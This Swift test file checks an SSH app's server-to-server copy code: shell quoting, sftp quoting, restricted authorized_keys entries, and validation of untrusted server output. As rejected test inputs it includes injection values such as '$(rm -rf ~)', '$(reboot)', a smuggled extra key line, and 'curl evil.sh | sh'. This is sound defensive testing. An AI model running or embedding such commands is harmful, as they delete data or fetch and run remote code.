@testable import AgentSshApp
import Foundation
import Testing

/// Tests for the direct server→server copy's command construction and
/// — more importantly — the validation of everything a server echoes
/// back before it gets embedded into a follow-up command. Server
/// output is untrusted input here.
struct DirectCopyShellTests {
    // MARK: - Quoting

    @Test("Single quotes in values cannot escape the shell quoting")
    func quoteEscapesSingleQuotes() {
        #expect(DirectCopyShell.quote("it's") == "'it'\\''s'")
    }

    @Test("Benign paths quote to themselves wrapped in single quotes")
    func quotePlainPath() {
        #expect(DirectCopyShell.quote("/var/www/site") == "'/var/www/site'")
    }

    // MARK: - Temp path validation (untrusted server output)

    @Test(
        "Accepts realistic mktemp results",
        arguments: ["/tmp/tmp.X8Zk2LqGfA", "/var/folders/ab/T/tmp.abc123", "/tmp/tmp.a_b-c.d"]
    )
    func acceptsMktempPaths(path: String) {
        #expect(DirectCopyShell.isSafeTempPath(path))
    }

    @Test(
        "Rejects injection attempts and non-absolute paths",
        arguments: [
            "tmp/relative",
            "/tmp/$(rm -rf ~)",
            "/tmp/a;b",
            "/tmp/a b",
            "/tmp/a'b",
            "/tmp/../etc",
            "/tmp/a`b`",
            "",
        ]
    )
    func rejectsUnsafePaths(path: String) {
        #expect(!DirectCopyShell.isSafeTempPath(path))
    }

    // MARK: - Public key validation (untrusted server output)

    @Test("Accepts the exact key the source was asked to generate")
    func acceptsMatchingKey() {
        let comment = DirectCopyShell.keyComment(keyId: "abc123", expiry: Date(timeIntervalSince1970: 2_000_000_000))
        let line = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlc+qE2bC3FmYg6Ai5cbXgWyKqGc4MLrnzpDmiwxGzQ \(comment)"
        #expect(DirectCopyShell.isValidEphemeralPublicKey(line, comment: comment))
    }

    @Test("Rejects keys with the wrong type, wrong comment, or smuggled content")
    func rejectsBadKeys() {
        let comment = DirectCopyShell.keyComment(keyId: "abc123", expiry: Date(timeIntervalSince1970: 2_000_000_000))
        let b64 = "AAAAC3NzaC1lZDI1NTE5AAAAIPlc+qE2bC3FmYg6Ai5cbXgWyKqGc4MLrnzpDmiwxGzQ"

        // Wrong key type.
        #expect(!DirectCopyShell.isValidEphemeralPublicKey("ssh-rsa \(b64) \(comment)", comment: comment))
        // Wrong comment.
        #expect(!DirectCopyShell.isValidEphemeralPublicKey("ssh-ed25519 \(b64) other-comment", comment: comment))
        // Trailing smuggled option line.
        #expect(!DirectCopyShell.isValidEphemeralPublicKey(
            "ssh-ed25519 \(b64) \(comment)\nssh-ed25519 EVIL evil",
            comment: comment
        ))
        // Shell metacharacters in the key body.
        #expect(!DirectCopyShell.isValidEphemeralPublicKey("ssh-ed25519 $(reboot) \(comment)", comment: comment))
    }

    // MARK: - Keygen output parsing

    @Test("Parses temp dir and public key out of a successful keygen run")
    func parsesKeygenOutput() throws {
        let comment = DirectCopyShell.keyComment(keyId: "deadbeef", expiry: Date(timeIntervalSince1970: 2_000_000_000))
        let output = """
        TMPDIR:/tmp/tmp.Xk29ZpQ
        ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlc+qE2bC3FmYg6Ai5cbXgWyKqGc4MLrnzpDmiwxGzQ \(comment)
        \(DirectCopyShell.okMarker)
        """
        let material = try #require(DirectCopyShell.parseKeygenOutput(output, comment: comment))
        #expect(material.tempDir == "/tmp/tmp.Xk29ZpQ")
        #expect(material.publicKeyLine.hasPrefix("ssh-ed25519 "))
        #expect(material.publicKeyLine.hasSuffix(comment))
    }

    @Test("Refuses keygen output without the success marker")
    func refusesFailedKeygen() {
        let comment = DirectCopyShell.keyComment(keyId: "deadbeef", expiry: Date())
        let output = "mktemp: failed\n\(DirectCopyShell.failMarker)"
        #expect(DirectCopyShell.parseKeygenOutput(output, comment: comment) == nil)
    }

    @Test("Refuses keygen output with a tampered temp dir even when marked successful")
    func refusesTamperedTempDir() {
        let comment = DirectCopyShell.keyComment(keyId: "deadbeef", expiry: Date())
        let output = """
        TMPDIR:/tmp/x; curl evil.sh | sh
        ssh-ed25519 AAAA \(comment)
        \(DirectCopyShell.okMarker)
        """
        #expect(DirectCopyShell.parseKeygenOutput(output, comment: comment) == nil)
    }

    // MARK: - Markers

    @Test("A command that prints both markers is treated as failed")
    func failMarkerWins() {
        #expect(!DirectCopyShell.succeeded("\(DirectCopyShell.okMarker)\(DirectCopyShell.failMarker)"))
        #expect(DirectCopyShell.succeeded("some output\n\(DirectCopyShell.okMarker)"))
        #expect(!DirectCopyShell.succeeded("no markers at all"))
    }

    // MARK: - Authorized keys line

    @Test("Installed key is pinned to restricted in-process SFTP")
    func restrictedLineShape() {
        let line = DirectCopyShell.restrictedAuthorizedKeysLine(publicKeyLine: "ssh-ed25519 AAAA comment")
        #expect(line == "restrict,command=\"internal-sftp\" ssh-ed25519 AAAA comment")
    }

    @Test("Key comment embeds the marker, id, and absolute expiry")
    func commentShape() {
        let comment = DirectCopyShell.keyComment(keyId: "cafe01", expiry: Date(timeIntervalSince1970: 1_900_000_000))
        #expect(comment == "agent-ssh-ephemeral-cafe01-expires-1900000000")
    }

    // MARK: - Command construction spot checks

    @Test("Transfer command pins known_hosts and never disables host key checking")
    func transferCommandIsPinned() {
        let cmd = DirectCopyShell.transferCommand(
            tempDir: "/tmp/tmp.abc",
            sourcePath: "/data/dump.tar",
            destPath: "backups/dump.tar",
            user: "deploy",
            host: "db-2.example.com",
            port: 22
        )
        #expect(cmd.contains("UserKnownHostsFile='/tmp/tmp.abc/kh'"))
        #expect(cmd.contains("BatchMode=yes"))
        #expect(cmd.contains("IdentitiesOnly=yes"))
        #expect(!cmd.contains("StrictHostKeyChecking=no"))
        #expect(cmd.contains("'deploy@db-2.example.com'"))
    }

    @Test("sftp batch paths escape quotes and backslashes for sftp's lexer")
    func sftpQuoteNeutralizesHostileFilenames() {
        // A hostile server can return listing entries with quotes or
        // backslashes; they must not break out of the batch-line quoting.
        #expect(DirectCopyShell.sftpQuote(#"/data/my"file.tar"#) == #""/data/my\"file.tar""#)
        #expect(DirectCopyShell.sftpQuote(#"/data/back\slash"#) == #""/data/back\\slash""#)
        #expect(DirectCopyShell.sftpQuote("/data/plain.tar") == #""/data/plain.tar""#)

        let cmd = DirectCopyShell.transferCommand(
            tempDir: "/tmp/tmp.abc",
            sourcePath: #"/data/my"file.tar"#,
            destPath: "backups/dump.tar",
            user: "deploy",
            host: "db-2.example.com",
            port: 22
        )
        #expect(cmd.contains(#"put "/data/my\"file.tar" "backups/dump.tar""#))
    }

    @Test("Install command sweeps expired ephemeral keys before appending")
    func installCommandSweeps() {
        let cmd = DirectCopyShell.installKeyCommand(publicKeyLine: "ssh-ed25519 AAAA agent-ssh-ephemeral-x-expires-1")
        #expect(cmd.contains("-expires-"))
        #expect(cmd.contains("awk"))
        #expect(cmd.contains("restrict,command=\"internal-sftp\""))
        #expect(cmd.contains("chmod 600"))
    }

    @Test("Removal command targets only the unique key id")
    func removalIsTargeted() {
        let cmd = DirectCopyShell.removeKeyCommand(keyId: "cafe01")
        #expect(cmd.contains("grep -v 'agent-ssh-ephemeral-cafe01'"))
    }
}
